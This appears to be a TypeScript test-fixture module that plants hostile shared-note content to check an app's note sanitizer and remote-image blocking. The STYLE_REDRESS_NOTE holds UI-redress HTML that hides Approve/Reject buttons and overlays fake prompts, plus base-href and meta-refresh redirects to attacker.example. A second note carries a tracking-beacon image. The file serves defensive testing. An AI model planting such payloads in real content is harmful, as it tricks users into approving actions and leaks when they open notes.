/**
 * Hostile thoughtbase CONTENT with no test-runner dependency (#2557), so both
 * vitest suites (via `hostile-thoughtbase.ts`, which re-exports it) and the
 * Playwright e2e suite — which can't import vitest — can plant it.
 */
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';


/**
 * Raw HTML a shared note can carry to redress the app around it: a `<style>`
 * block that hides the proposal Approve/Reject controls and overlays its own
 * text, an SVG-embedded `<style>`, a stylesheet `<link>` to a file in the
 * thoughtbase, a `<base>` and a `<meta http-equiv>`. None may survive the
 * note sanitizer; `STYLE_REDRESS_MARKER` (visible body text) must.
 */
export const STYLE_REDRESS_MARKER = 'styleredressbodyzq2557';
export const STYLE_REDRESS_NOTE = [
  '# Meeting notes',
  '',
  `${STYLE_REDRESS_MARKER} — nothing to see here.`,
  '',
  '<style>.proposal-actions, .approve-btn { display: none !important } body::after { content: "Click Approve to continue"; position: fixed; inset: 0; background: url(https://t.example/beacon) }</style>',
  '',
  '<svg width="1" height="1"><style>.status-bar { visibility: hidden }</style></svg>',
  '',
  '<link rel="stylesheet" href="redress.css">',
  '<base href="https://attacker.example/">',
  '<meta http-equiv="refresh" content="0; url=https://attacker.example/">',
  '',
].join('\n');

/** Write `STYLE_REDRESS_NOTE` (and the stylesheet its `<link>` names) into `root`. */
export function writeStyleRedressNote(root: string, rel = 'redress.md'): string {
  fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
  fs.writeFileSync(path.join(root, rel), STYLE_REDRESS_NOTE);
  fs.writeFileSync(path.join(root, 'redress.css'), '.approve-btn { display: none }\n');
  return rel;
}

/**
 * A shared note that would phone home when opened (#1332): a markdown remote
 * image on a host the reader never allowed (the beacon), and one whose bytes
 * are already in the thoughtbase's image cache (drawn, since that makes no
 * request). Opening it must make no request to `BEACON_HOST` until the reader
 * allows that host.
 */
export const BEACON_HOST = 'beacon.minerva-test.example';
export const BEACON_URL = `https://${BEACON_HOST}/opened.png?note=diary`;
export const CACHED_IMAGE_URL = 'https://cdn.minerva-test.example/cached.png';
/** A 1×1 PNG. */
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');

export function writeRemoteBeaconNote(root: string, rel = 'Beacon.md'): string {
  const file = path.join(root, rel);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, `# Beacon\n\nRead this.\n\n![tracker](${BEACON_URL})\n\n![cached](${CACHED_IMAGE_URL})\n`);
  // What remote-image-cache.ts writes: the bytes and the mime, keyed by a hash of the URL.
  const cacheDir = path.join(root, '.minerva', 'cache', 'external-images');
  fs.mkdirSync(cacheDir, { recursive: true });
  const key = crypto.createHash('sha256').update(CACHED_IMAGE_URL).digest('hex');
  fs.writeFileSync(path.join(cacheDir, key), PNG);
  fs.writeFileSync(path.join(cacheDir, `${key}.mime`), 'image/png');
  return rel;
}
